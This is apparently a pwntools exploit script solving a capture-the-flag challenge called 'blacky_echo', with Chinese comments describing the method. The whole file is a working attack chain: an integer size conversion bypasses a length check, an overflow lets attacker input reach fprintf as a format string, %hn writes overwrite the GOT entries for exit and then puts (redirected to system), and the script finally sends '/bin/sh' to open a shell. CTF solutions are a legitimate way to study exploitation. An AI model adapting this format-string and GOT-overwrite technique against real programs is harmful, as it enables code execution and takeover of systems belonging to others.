#利用类型转换绕过长度限制，然后利用溢出覆盖下一变量使得可以利用fprintf格式化字符串，
#先修改got['exit']造成函数复用，再改got['puts']为system
from pwn import *
context.log_level = 'debug'
#p = remote("challs.m0lecon.it", 9011)
p = process('./blacky_echo')
n = int('0x7fff0001', 16)
p.sendlineafter("Size: ", str(n))

payload = '%3216c%12$hn'+'a'*7+p64(0x602088)
p.sendlineafter("Input: ", 'a'*0x1000a+payload)
p.sendlineafter("Size: ", str(n))
payload = '%2091c%12$hn'+'a'*7+p64(0x602020)
p.sendlineafter("Input: ", 'a'*0x1000a+payload)
gdb.attach(p, 'b* 0x400c77')
p.sendlineafter("Size: ", '20')
p.sendlineafter("Input: ", 'ECHO->/bin/sh')
p.interactive()